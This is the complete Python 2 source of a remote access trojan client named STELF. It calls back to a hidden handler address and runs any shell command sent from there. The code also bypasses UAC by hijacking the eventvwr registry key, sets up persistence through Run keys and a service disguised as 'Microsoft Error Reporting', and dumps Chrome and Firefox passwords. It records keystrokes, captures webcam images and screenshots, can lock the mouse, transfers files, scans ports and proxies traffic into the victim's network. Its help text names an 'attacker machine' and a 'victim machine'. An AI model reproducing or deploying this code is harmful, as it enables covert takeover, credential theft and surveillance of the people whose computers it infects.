import socket
import Queue
import subprocess
import os
import threading
import logging
import time
import psutil
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib
import getpass
import ctypes
import sys
import string
import vidcap
import StringIO

if os.name == "nt":
	import passdump
	import win32net
	import win32api
	import win32con
	import pyHook
	import pythoncom
	import pyscreenshot
	
if sys.stdout.isatty():
	logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
else:
	logging.basicConfig(level=logging.CRITICAL, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

try:
	print sys.frozen
	logging.debug("Looks like we're compiled. Let's read encoded data...")
	with open(sys.argv[0], "rb") as f:
		f.seek(972)
		HANDLER_IP = ""
		for i in range(4):
			HANDLER_IP += str(ord(f.read(1)))+"."
		port1 = ord(f.read(1))
		port2 = ord(f.read(1))
		HANDLER_PORT = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		HANDLER_IP = HANDLER_IP[:-1]
		
		f.seek(930)
		AUTH_SECRET = f.read(30)
except Exception as e:
	logging.debug("We're uncompyled, let's use these values...")
	HANDLER_IP = "127.0.0.1"
	HANDLER_PORT = 8080
	with open("stelf.guid", "rb") as f:
		AUTH_SECRET = f.read()
		
logging.debug("Handler is at "+str(HANDLER_IP)+":"+str(HANDLER_PORT)+", auth key is "+AUTH_SECRET)

def windows_only(func):
	"""
	This decorator can be used to mark functions that will only work on Windows.
	"""
	def tester(*args):
		if os.name != "nt": return "Command not available on non-windows OS."
		else: return func(*args)
	return tester
	
def status(stat):
	shell.transport.user_channel.signal("STATUS:"+stat)

class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force. All threads should get a handle to themselves using threading.currentThread(), then check the stopped() flag every loop.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	A channel is essentially two queues, one for inputting data into a thread, one for getting the output. Each channel is identified by a single byte prepended to the data. Usually, data is fed into the chanel by a thread that receives it from the handler, and read from the output by another thread which sends it back.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		self.stale = False
		
		logging.debug("Channel created with ID "+str(ord(self.id)))
		
	def write_input(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
		self.input_queue.put(data)
		
	def read_input(self, blocking=True):
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip()[:100])
			return data
		except Queue.Empty: return None
		
	def write_output(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip()[:100])
		self.output_queue.put(self.id+data)
		
	def signal(self, data):
		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data[:100])
		self.output_queue.put(chr(254)+data)
		
	def __repr__(self):
		return "Channel ID: "+str(ord(self.id))
		
	def __str__(self):
		return self.__repr__()
		
class ProxyConnection:
	"""
	This class is used to create a socksv4 proxy, to forward connections from the handler's to shell's network.
	"""
	def __init__(self, channel):
		self.channel = channel
		self.disconnected = False
		logging.info("Creating new proxy connection. "+repr(self.channel))
		self.disconnected = False
		
		t = StoppableThread(target=self.start)
		t.daemon = True
		t.start()
		
	def start(self):
		logging.debug("Proxy connection starting.")
		data = self.channel.read_input()
		version, type, remote_port, remote_host, user_id = ord(data[0]), ord(data[1]), data[2:4], data[4:8], data[8:-1]
		if version != 4 or type != 1:
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return
			
		port1, port2 = ord(remote_port[0]), ord(remote_port[1])
		self.remote_port = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
		self.remote_host = ".".join([str(ord(remote_host[i])) for i in range(4)])
		
		self.remote_socket = socket.socket()
		self.remote_socket.settimeout(20)
		self.connect()
		
	def send(self, data):
		self.channel.write_output(data)
		
	def connect(self):
		try:
			logging.info("Proxy connection on channel #"+str(self.channel.id)+": Connecting to "+str(self.remote_host)+":"+str(self.remote_port)+"...")
			self.remote_socket.connect((self.remote_host, self.remote_port))
			logging.info("Connection successful!")
			self.remote_socket.settimeout(None)
		except:
			logging.info("Connection failed.")
			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
			return

		self.send("\x00\x5A\x00\x00\x00\x00\x00\x00")
		self.relay()
		
	def reader(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.remote_socket.recv(8192)
			if not data:
				self.disconnected = True
				self.channel.stale = True
				return
			self.send(data)
			
	def writer(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.channel.read_input()
			self.remote_socket.sendall(data)
		
	def relay(self):
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
class PortForwarder:
	"""
	This is the reverse of the socks proxy. Instead of talking the socksv4 protocol, it simply binds to a local port and forwards all data to a host specified on creation, proxying it through the handler.
	"""
	def __init__(self, channel, bind_port):
		self.channel = channel # TODO: Make it accept multiple connections!!!!!!
		self.bind_port = bind_port
		self.bind_sock = socket.socket()
		self.disconnected = False
		
		self.bind_sock.bind(("0.0.0.0", self.bind_port))
		self.bind_sock.listen(1)
		
		t = StoppableThread(target=self.run)
		t.daemon = True
		t.start()
		
	def run(self):
		self.client_socket, addr = self.bind_sock.accept()
		
		for f in [self.reader, self.writer]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
		
	def reader(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.client_socket.recv(8192)
			if not data:
				self.disconnected = True
				self.channel.stale = True
				return
			self.send(data)
			
	def writer(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.channel.read_input()
			self.client_socket.sendall(data)

		
	
class Transport:
	""""
	Transport handles connecting to the handler, managing channels, and communicating with the handler. One thread receives data, checks which channel it should be forwarded to, and puts it on the correct queue. Another gets data from a queue all channels write to, and sends it to the handler.
	"""
	def __init__(self, handler_ip, handler_port, key):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		self.auth_key = key
		
		self.comm_socket = socket.socket()
		
		self.master_queue = Queue.Queue()
		self.user_channel = Channel(chr(97), self.master_queue)
		self.signal_channel = Channel(chr(254), self.master_queue)
		
		self.disconnected = False
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}

		
	def connect(self):
		logging.info("Attempting to connect to "+self.handler_ip+":"+str(self.handler_port))
		#try:
		self.comm_socket.connect((self.handler_ip, self.handler_port))
		logging.info("Connected!")
		self.comm_socket.sendall(chr(255)*30)
		time.sleep(random.randint(100,500)/100) # Waiting a random amount of time since multiple clients
		self.aes_obj = self.dh_exchange() # connecting at the exact same time causes the handler to hang
		
		data = socket.gethostname()+"|"+str(misc.isadmin())
		
		self.comm_socket.sendall(data)
		
		for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
		return True
		#except Exception as e:
		#	logging.warn("Failed to connect to handler: "+str(e))
		#	return False
			
	def dh_exchange(self):
		"""
		This function sets up a secure connection with the handler using the Diffie-Hellman Exchange.
		"""
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1) # Generate a number 255 digits long
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(str(sharedSecret)+str(self.auth_key)+str(self.comm_socket.getsockname()[1]))).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)

	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data+chr(255))
		except: pass # If we can't send data, the recv function probably already noticed the connection died, and will restart everything soon.
		
	def recv(self):
		if self.disconnected: return ""
		
		try:
			data = ""
			while not data.endswith(chr(255)):
				temp = self.comm_socket.recv(4096)
				if not temp:
					data = None
					break
				data += temp
			data = data[:-1]
		except: data = ""
		
		if not data:
			logging.error("Handler disconnected")
			self.comm_socket.close()
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to handler: "+data[1:][:100])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from handler: "+data.strip()[:100])
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal[:100])
			if signal.startswith("CREATE_CHANNEL"):
				self.create_channel(signal.split(":")[1])
			elif signal.startswith("CREATE_PROXY"):
				ProxyConnection(self.channels[signal.split(":")[1]])
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)
		
class Execute:
	"""
	Functions related to executing programs.
	"""
	def __init__(self):
		self.killed = False
		
	def kill_proc(self, pid):
		logging.warn("Killing command after taking over a minute to execute.")
		process = psutil.Process(pid)
		for proc in process.children(recursive=True): # Kill the children first so the parent has to suffer
			proc.terminate()
		process.terminate()
		self.killed = True
		
	def execute_shell_command(self, command):
		"""
		The core of the whole shell, this function executes shell commands. If the process takes longer than 60 seconds to return, it is killed, and the user is notified about it.
		"""
		logging.info("Executing shell command: "+command.strip())
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		timer = threading.Timer(60, self.kill_proc, [proc.pid])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		if self.killed: out += "\n(Process terminated after taking too long to execute)"
		timer.cancel()
		self.killed = False
		logging.debug("Result of shell command: "+out.strip())
		return proc.returncode, out
		
class Filesystem:
	"""
	Functions related to interacting with the file system.
	"""
	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
			
	def download(self, path, channel):
		logging.info("Starting download of file: "+path)
		try:
			with open(path, "rb") as f:
				while True:
					data = f.read(8192)
					if not data: break
					channel.write_output(base64.b64encode(data))
					time.sleep(0.1) # Sleep, otherwise some data will be missing and jumbled
			
			channel.write_output(base64.b64encode(chr(255)))
			
		except Exception as e:
			channel.write_output("Error: "+str(e))
		
		return ""
			
	def upload(self, path, channel):
		logging.info("Starting upload of file: "+path)
		
		with open(path, "wb") as f:
			while True:
				data = channel.read_input()
				if data == "CONN_LOST": return True
				data = base64.b64decode(data)
				if data.endswith(chr(255)):
					data = data[:-1]
					if not data: break
					f.write(data)
					break
				f.write(data)
			logging.info("Upload complete.")
			return ""
			
class Miscellaneous:
	"""
	Miscellaneous functions that don't fit into any other category.
	"""
	def isadmin(self):
		if os.name == "nt": return ctypes.windll.shell32.IsUserAnAdmin() != 0
		else: return os.geteuid() == 0
		
	def ASCIIfy(self, string):
		return ''.join([i if ord(i) < 128 else '' for i in string])
		
	@windows_only
	def is_user_in_group(self, group, member):
		members = win32net.NetLocalGroupGetMembers(None, group, 1)
		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
		return False
	 
	@windows_only
	def name_of_admin_group(self):
		for line in execute.execute_shell_command("whoami /groups")[1].splitlines():
			if "S-1-5-32-544" in line: # S-1-5-32-544 is a well-known identifier for the admin group
				return line.split()[0].split("\\")[1]
				
	@windows_only
	def persist(self):
		random_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
		if self.isadmin():
			retval = subprocess.Popen("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
			retval.communicate()

			if retval.returncode == 0:
				return "Succesfully added file to registry for local machine."
		else:
			retval = subprocess.Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
			retval.communicate()
			if retval.returncode == 0:
				return "Succesfully added file to current user's registry."
				
		return "Failed to add file to registry."
		
class Privilege_Escalation:
	"""
	Functions related to escalating privileges.
	"""
	@windows_only
	def bypass_uac(self):
		logging.info("Attempting to bypass UAC.")
		if misc.isadmin():
			logging.debug("UAC bypass failed: Process already has admin privileges.")
			return "[*]You already have admin privileges!" # Check your privilege!
		 
		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
			logging.debug("UAC bypass failed: Current user is not part of admin group.")
			return "[-]Current user is not part of admin group."
		 
		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin")[1].split()[3] == "0x5":
			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
			return "[-]UAC is disabled or notification policy is set to 'Always'"
			
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
		shell.transport.signal_channel.signal("NEW_SESH")
		os.startfile("eventvwr.exe") # Eventvwr is a program that autoelevates and also runs a program specified in a certain registry key.
		time.sleep(2)
		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
		
		return "BG_NEW_SESH"
		
	@windows_only
	def create_service(self, path, name):
		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto")[0] != 0:
			return False
		if execute.execute_shell_command("sc start "+name)[0] != 0: # TODO: check why this is broken
			return False											# Broken cuz we're not a proper service
		return True
		
	@windows_only
	def remove_service(self, name):
		execute.execute_shell_command("sc delete "+name)
		
	@windows_only
	def get_system(self):
		if not misc.isadmin(): return "[-]You need admin privileges to get system." # Check your privilege! (That was funny the first time)
		self.create_service(os.path.abspath(sys.executable), '"Microsoft Error Reporting"')
		return "BG_NEW_SESH"
		
		
class Information_Gathering:
	"""
	Functions related to gathering data from the system.
	"""
	def __init__(self):
		self.keylog_thread = None
		self.mouselock = None
		self.keylock = None
		self.key_log = ""
		
	@windows_only
	def dump_chrome(self):
		return passdump.dump_chrome()
		
	@windows_only
	def dump_firefox(self):
		return passdump.dump_firefox()
		
	@windows_only
	def keylog_start(self):
		def keypress(event):
			if event.Ascii == 13:
				self.key_log += "[RETURN]"
			elif event.Ascii == 9:
				self.key_log += "[TAB]"
			else:
				self.key_log += chr(event.Ascii)
			return True
			
		def pumpit_louder():
			ct = threading.currentThread()
			while not ct.stopped():
				hook = pyHook.HookManager()
				hook.KeyDown = keypress
				hook.HookKeyboard()
				pythoncom.PumpMessages()
				
			hook.UnhookKeyboard()
		
		t = StoppableThread(target=pumpit_louder)
		t.daemon = True
		t.start()
		
		self.keylog_thread = t
		
		return "[+] Logging started."
		
	@windows_only
	def keylog_stop(self):
		self.keylog_thread.stop()
		win32api.PostThreadMessage(self.keylog_thread.ident, win32con.WM_QUIT, 0, 0) # pythoncom.PumpMessages() stops when it gets a WM_QUIT message.
		return "[+] Logging stopped."
		
	@windows_only
	def keylog_dump(self):
		log = self.key_log
		self.key_log = ""
		return log
		
	@windows_only
	def lock_mouse(self):
		def DENIED(event): return False
		
		def pumper():
			ct = threading.currentThread()
			while not ct.stopped():
				hook = pyHook.HookManager()
				hook.MouseAll = DENIED
				hook.HookMouse()
				pythoncom.PumpMessages()
				
		t = StoppableThread(target=pumper)
		t.daemon = True
		t.start()	

		self.mouselock = t
		
	def unlock_mouse(self):
		self.mouselock.stop()
		win32api.PostThreadMessage(self.mouselock.ident, win32con.WM_QUIT, 0, 0)
		
	@windows_only
	def uictl(self, action, what):
		if action == "lock":
			if what == "mouse":
				self.lock_mouse()
				
		elif action == "unlock":
			if what == "mouse":
				self.unlock_mouse()
				
		return "k"
		
	@windows_only
	def webcam_list(self):
		num = 0
		cams = "Available cameras:"
		while True:
			try:
				cam = vidcap.new_Dev(num, 0)
				cams += "\n["+str(num)+"] "+cam.getdisplayname()
			except Exception as e:
				break
			num += 1
			
		return cams
		
	@windows_only
	def webcam_snap(self, id):
		try:
			cam = vidcap.new_Dev(int(id), 0)
		except:
			return "[-] No such camera found: "+str(id)
			
		time.sleep(2) # So camera has time to adjust focus, brightness, etc.
		
		buffer, width, height = cam.getbuffer()
		return base64.b64encode(buffer)+"|"+str(width)+"|"+str(height)+"|"
		
	@windows_only
	def take_screenshot(self):
		try:
			img = pyscreenshot.grab(childprocess=False)
			img_data = img.tobytes()
			width, height = img.size
			
			return base64.b64encode(img_data)+"|"+str(width)+"|"+str(height)+"|"
		except Exception as e:
			return "A|1|1|"
		
		
class Networking:
	"""
	Network discovery, port scans, etc.
	"""
	def scan_host(self, host, ports, q):
		logging.debug("Starting portscan of host "+host+", ports: "+str(ports))
		random.shuffle(ports)
		for port in ports:
			try:
				s = socket.socket()
				s.settimeout(0.7)
				s.connect((host, int(port)))
				q.put((host, port))
			except:
				continue
				
	def portscan(self, hosts, ports):
		q = Queue.Queue()
		host_list = []
		port_list = []
		for i in ports.split(","):
			try:
				if '-' not in i:
					port_list.append(i)
				else:
					a, b = map(int, i.split('-'))
					port_list += range(a, b+1)
			except:
				return "Invalid port range"
				
		if not port_list or port_list[0] == []:
			return "Invalid port range"
				
		host_range = ".".join(hosts.split(".")[:3])
		try:
			for i in hosts.split(","):
				print i
				print hosts.split(".")
				if '-' not in i.split(".")[3]:
					host_list.append(host_range+"."+str(i.split(".")[3]))
				else:
					a, b = map(int, i.split(".")[3].split('-'))
					for c in range(a, b+1):
						host_list.append(host_range+"."+str(c))
		except Exception as e:
			return "[-]Invalid host range"
			
		if not host_list or host_list[0] == []:
			return "[-]Invalid host range"
				
		threads = []
		for host in host_list:
			t = threading.Thread(target=self.scan_host, args=(host, port_list, q))
			t.daemon = True
			t.start()
			threads.append(t)
			
		for t in threads:
			t.join()
			
		open = []
		while not q.empty():
			open.append(q.get())
			
		hosts = {}
		for host, port in open:
			if host not in hosts:
				hosts[host] = str(port)
			else:
				hosts[host] += ","+str(port)
			
		out = ""
		for host in hosts:
			out += host+":\n"
			for port in set(sorted(hosts[host].split(","))):
				out += "  "+str(port)+" OPEN\n"
			out += "\n"
			
		return out # This is absolutely horrible but I don't see how it can be improved
		
		
execute = Execute()
fs = Filesystem()
misc = Miscellaneous()
privesc = Privilege_Escalation()
info = Information_Gathering()
net = Networking()
	
class Shell:
	"""
	The shell class receives commands input by the user and acts accordingly.
	"""
	def __init__(self, transport):
		self.transport = transport
		self.channel = self.transport.user_channel
		
	def run(self):
		if not self.transport.connect(): return False
		
		while True:
			data = self.recv()
			if data == "CONN_LOST":
				return False
			elif data == "PING":
			    output = "PONG"
			elif data == "help" or data == "?":
				output = '''Commands:
isadmin - Returns whether the current process has admin privileges.
bypassuac - Bypasses UAC.
dumpchrome - Dumps Chrome credentials.
dumpff - Dumps Firefox credientials.
die - Quit the shell.
getsystem - Get the system and escalate privs!
download [file] - Download a file to attacker machine.
upload [file] - Upload file to victim machine.
portscan [hosts] [ports] - Perform a port scan on given hosts.
proxy start - Start SOCKSv4 proxy on victim.
persist - Add STELF to autorun.
keylog|keyscan [start|stop|dump] - Start or stop the keylogger, or print logged keys.
webcam [list|snap] [id] - Take a picture from the webcam
help - This menu!
'''
			elif data.startswith("cd"):
				data = data[3:]
				output = fs.change_directory(data.strip())
				
			elif data == "ls":
				output = execute.execute_shell_command("dir")[1]
				
			elif data == "ps":
				output = execute.execute_shell_command("tasklist")[1]
				
			elif data.startswith("killall"):
				process = data.split()[1]
				output = execute.execute_shell_command("taskkill /F /IM "+process+" /T")
				
			elif data == "isadmin":
				output = str(misc.isadmin())
				
			elif data == "bypassuac":
				output = privesc.bypass_uac()
				
			elif data == "dumpchrome":
				output = info.dump_chrome()
				
			elif data == "dumpff":
				output = info.dump_firefox()
				
			elif data == "die":
				os._exit(0)
				
			elif data == "getsystem":
				output = privesc.get_system()
				
			elif data.startswith("download"):
				file = data.split()[1]
				output = fs.download(file, self.channel)
				
			elif data.startswith("upload"):
				file = data.split()[1]
				output = fs.upload(file, self.channel)
				if output: return False
				
			elif data == "persist":
				output = misc.persist()
				
			elif data.startswith("portscan"):
				try:
					hosts, ports = data.split()[1], data.split()[2]
					output = net.portscan(hosts, ports)
				except Exception as e:
					output = str(e)+"\nusage: portscan [host_range] [port_range]"
					
			elif data.startswith("keylog") or data.startswith("keyscan"):
				try:
					arg = data.split()[1]
				except:
					output = "[*] Usage: keylog [start|stop|dump]"
					arg = ""
				if arg == "start":
					output = info.keylog_start()
				elif arg == "stop":
					output = info.keylog_stop()
				elif arg == "dump":
					output = info.keylog_dump()
					
			elif data.startswith("webcam"):
				try:
					arg = data.split()[1]
				except:
					output = "[*] Usage: webcam [list|snap [id] ]"
					arg = ""
				
				if arg == "list":
					output = info.webcam_list()
				elif arg == "snap":
					try: num = data.split()[2]
					except: output = "[*] Usage: webcam [list|snap [id] ]"
					output = info.webcam_snap(num)
					
			elif data.startswith("uictl"):
				try:
					action, what = data.split()[1], data.split()[2]
				except:
					output = "why"
				else:
					output = info.uictl(action, what)
					
			elif data == "screenshot":
				output = info.take_screenshot()

			else:
				output = execute.execute_shell_command(data)[1]

			if output != "BG_NEW_SESH": self.send(str(output)+"\n"+os.getcwd()+">>")
		
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
		
while True:
	shell = Shell(Transport(HANDLER_IP,HANDLER_PORT, AUTH_SECRET))
	if not shell.run():
		del shell
		for t in threading.enumerate():
			try: t.stop() # RED LIGHT
			except: pass
		time.sleep(5)
			
if __name__ == "__main__":
	main()
	